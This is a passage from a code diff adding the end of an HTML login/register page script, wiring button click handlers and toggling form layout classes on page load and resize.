+    if(loginBtn) loginBtn.addEventListener('click', executeLogin);
+    if(registerBtn) registerBtn.addEventListener('click', executeRegister);
+    
+    window.addEventListener('DOMContentLoaded', () => {
+        regeneratePuzzle();
+        document.body.classList.remove('register-active');
+        const cardDiv = document.getElementById('dynamicCardContainer');
+        if(cardDiv) {
+            cardDiv.classList.add('login-layout');
+            cardDiv.classList.remove('register-layout');
+        }
+        const loginForm = document.getElementById('loginFormContainer');
+        const registerForm = document.getElementById('registerFormContainer');
+        if(loginForm) loginForm.classList.add('active-form');
+        if(registerForm) registerForm.classList.remove('active-form');
+        updateLoginButtonState();
+    });
+    
+    window.addEventListener('resize', () => {
+        if (document.getElementById('registerFormContainer') && document.getElementById('registerFormContainer').classList.contains('active-form')) regeneratePuzzle();
+    });
+</script>
+</body>
+</html>
